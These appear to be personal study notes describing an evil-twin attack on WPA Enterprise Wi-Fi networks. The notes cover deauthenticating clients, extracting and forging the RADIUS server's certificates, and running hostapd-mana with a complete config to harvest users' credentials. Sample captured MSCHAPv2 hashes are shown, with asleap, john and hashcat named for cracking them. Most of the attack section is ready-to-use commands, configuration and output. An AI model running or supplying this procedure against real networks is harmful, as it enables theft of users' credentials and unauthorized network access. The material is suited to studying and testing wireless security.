### Introduction
---
WPA Enterprise uses a central database for user authentication, thus removing the need of the same passphrase.

WPA Enterprise uses the Extensible Authentication Protocol (EAP) framework that allows different authentication schemes. Moreover, authentication is done by using a Remote Authentication Dial-In User Service (RADIUS) server.

The client first sends a few EAP frames to the AP. The AP then relay the frames to the RADIUS server. The PMK is then generated from the results.
###### EAP-TLS:
Requires certificates on both client and server side. Login is not needed and both will mutually authenticate each other.
###### EAP-TTLS:
Only requires server side certificate. A TLS tunnel is created for users to submit credentials.
###### PEAP:
Also creates a TLS tunnel before exchanging credentials.

### Attack
---
In WPA Enterprise, we can only attack the clients by creating a rogue AP to capture credentials. Also requires `freeradius` to generate certificates.

> [!note]
> These steps are only used to forge a certificate to trick the client. If the client does not check the certificate, we can simply just create a rogue AP with the same SSID to lure clients into connecting.

##### Step 1: Capture a handshake (and the certificate)
###### Airodump-ng:
Use airodump-ng to capture a handshake of the target AP.
```sh
sudo airodump-ng wlan0mon -c <channel> --bssid <bssid> -w <output name>
```

###### De-authentication Attack:
De-auth the client.
```sh
sudo aireplay-ng -0 1 -a <AP bssid> -c <client bssid> wlan0mon
```


##### Step 2: Packet Inspection
Upon capturing the handshake, open it with Wireshark, and use this filter:
```
tls.handshake.certificate
```

Then go to `Packet Details`, open `Extensible Authentication Protocol` >Â `Transport Layer Security`. Then open `TLSv1 Record Layer: Handshake Protocol: Certificate`.  Then expand `Handshake Protocol: Certificate item`, then `Certificates`.
![[Pasted image 20240708164305.png]]

Right click on each certificate, select `Export Packet Bytes` and save them with a `.der` extension.

Display information of the certs:
```
openssl x509 -inform der -in [CERTIFICATE_FILENAME] -tex
```

Convert the certs to `.pem` format if needed:
```
openssl x509 -inform der -in [CERTIFICATE_FILENAME] -outform pem -out [OUTPUT_PEM].crt
```

##### Step 3: Run `freeradius`
###### Install freeradius:
```
sudo apt install freeradius
```

###### Modify the config files:
```
sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
```
- Change the `[certificate_authority]` to match those of the captured certificates.

```
sudo mousepad /etc/freeradius/3.0/certs/server.cnf
```
- Change the `[server]` to match those of the captured certificates.

###### Building the certificates:
1. Regenerate `dh`:
```
rm dh
```
&
```
make
```
- `make` will not overwrite existing certs. We have to run `make destroycerts` to clean up.


##### Step 4. Run `hostapd-mana` for Rogue Access Point:
###### Create the config file:
```
sudo mousepad /etc/hostapd-mana/mana.conf
```

Example config file:
```
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

###### Create a EAP user file:
```
sudo mousepad /etc/hostapd-mana/mana.eap_user
```
The file should contain the following:
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```
- The first column indicates a specific user by username or, in the event of wildcard character (`*`), any user. It can contain a domain name as well.
- The second column contains the protocols allowed for the specific users and authentication phase.
- The third one is optional and is used for the password when a specific user is mentioned.
- The fourth one, indicated here with `[2]`, indicates that the settings on this line are for phase 2 authentication.

###### Run hostapd-mana:
```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```

Example output for successful capture:
```
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: authenticated
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: associated (aid 1)
wlan0: CTRL-EVENT-EAP-STARTED 00:2b:bb:b0:42:9e
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: cosmo
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: cosmo
MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
```

##### Step 5: Cracking the captured credentials:
From the above output, we can see that different hashes are provided for different methods:
```
...
MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
```
- asleap, john & hashcat.



### MISC
---
To check the validity of existing certificates, use:
```
openssl x509 -in <CERT_FILENAME> -noout -enddate
```
- The certificate should be ending with `.pem` or `.crt`.

